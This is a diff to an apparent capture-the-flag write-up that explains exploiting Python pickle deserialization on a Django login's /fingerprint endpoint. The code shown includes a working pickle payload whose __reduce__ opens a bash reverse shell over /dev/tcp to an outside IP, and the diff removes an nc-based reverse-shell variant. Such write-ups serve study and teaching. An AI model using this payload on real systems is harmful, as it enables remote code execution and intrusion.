@@ -12,7 +12,7 @@ By visting a random subdir from the robots.txt file we get a Django debug messag
 
 The name of the challenge, "Solenya", and the "pickle Rick" references could very likely be a hint about Pickle (https://docs.python.org/3/library/pickle.html), which is used to serialize python objects. Since the webpage runs Django this seems likely. Exploiting pickle to deserialize an object that gives code executin is a common trick (https://blog.nelhage.com/2011/03/exploiting-pickle/), so we basically just need to find out how to send some data that will be deserialzied by the website, then create and send our payload.
 
-After playing around with the login prompt we see that after a login attempt a huge POST request is mad eto /fingerprint:
+After playing around with the login prompt we see that after a login attempt a huge POST request is made to /fingerprint:
 
 ```
 POST /fingerprint/ HTTP/1.1
@@ -68,7 +68,6 @@ import base64
 class RunBinSh(object):
   def __reduce__(self):
     return (subprocess.Popen, (('/bin/bash','-c', 'bash >/dev/tcp/172.31.127.232/8181 0>&1 2>&1'),))
-    #return (subprocess.Popen, (('/bin/nc','172.31.127.232','8181'),))
 
 print cPickle.dumps(RunBinSh())
 cPickle.loads(cPickle.dumps(RunBinSh()))
